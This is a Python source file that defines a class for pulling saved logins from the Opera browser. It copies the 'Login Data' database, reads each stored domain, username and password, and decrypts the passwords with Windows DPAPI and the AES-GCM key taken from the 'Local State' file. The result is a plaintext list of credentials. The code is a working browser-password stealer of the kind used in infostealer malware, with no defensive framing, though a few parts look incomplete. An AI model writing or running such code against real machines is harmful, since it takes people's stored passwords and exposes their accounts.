import os
import sys
import shutil
import sqlite3
import json
import base64

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

class OperaCredentialRetriever:
    def __init__(self):
        self.credential_data = ""
        self.LOCAL_PATH = os.environ['LOCALAPPDATA']
        self.DB_LOCATION = r'Opera Software\Opera Stable\User Data\Default\Login Data'
        self.opera_data_path = os.path.join(self.LOCAL_PATH, self.DB_LOCATION)

    def execute(self):
        if not os.path.exists(self.opera_data_path):
            return  "Browser not installed: Opera"
        
        source_path = os.path.join(self.LOCAL_PATH, self.DB_LOCATION)
        temp_path = os.path.join(self.LOCAL_PATH, 'temp_db_file')
        if os.path.exists(temp_path):
            os.remove(temp_path)
        shutil.copyfile(source_path, temp_path)
        self.extract_credentials(temp_path)
        return self.credential_data

    def extract_credentials(self, db_file):
        conn = sqlite3.connect(db_file)
        query = 'SELECT signon_realm, username_value, password_value FROM logins'
        for row in conn.execute(query):
            domain = row[0]
            if domain.startswith('android'):
                continue
            username = row[1]
            password = self.decrypt_password(row[2])
            info = 'Domain: %s\nUsername: %s\nPassword: %s\n\n' % (domain, username, password)
            self.credential_data += info
        conn.close()
        os.remove(db_file)

    def decrypt_password(self, encrypted_value):
        if sys.platform == 'win32':
            try:
                if encrypted_value[:4] == b'\x01\x00\x00\x00':
                    return self.dpapi_decrypt(encrypted_value).decode()
                elif encrypted_value[:3] == b'v10':
                    return self.aes_decrypt(encrypted_value)[:-16].decode()
            except WindowsError:
                return None
        else:
            try:
                return self.linux_decrypt(encrypted_value)
            except NotImplementedError:
                return None

    def get_cipher_instance(self, key):
        return Cipher(
            algorithms.AES(key),
            None,
            backend=default_backend()
        )

    def dpapi_decrypt(self, encrypted):
        import ctypes
        import ctypes.wintypes

        class DataBlob(ctypes.Structure):
            _fields_ = [('cbData', ctypes.wintypes.DWORD),
                        ('pbData', ctypes.POINTER(ctypes.c_char))]

        buffer = ctypes.create_string_buffer(encrypted, len(encrypted))
        blob_in = DataBlob(ctypes.sizeof(buffer), buffer)
        blob_out = DataBlob()
        result = ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
        if not result:
            raise ctypes.WinError()
        decrypted_data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return decrypted_data

    def retrieve_encryption_key(self):
        with open(os.path.join(os.environ['LOCALAPPDATA'], r"Opera Software\Opera Stable\User Data\Local State"), encoding='utf-8', mode="r") as file:
            data = json.loads(str(file.readline()))
        return data["os_crypt"]["encrypted_key"]

    def aes_decrypt(self, encrypted_data):
        encoded_key = self.retrieve_encryption_key()
        encrypted_key = base64.b64decode(encoded_key.encode())[5:]
        key = self.dpapi_decrypt(encrypted_key)
        nonce = encrypted_data[3:15]
        cipher = self.get_cipher_instance(key)
        return self.decrypt_aes(cipher, encrypted_data[15:], nonce)

    def decrypt_aes(self, cipher, encrypted_data, nonce):
        cipher.mode = modes.GCM(nonce)
        decryptor = cipher.decryptor()
        return decryptor.update(encrypted_data)
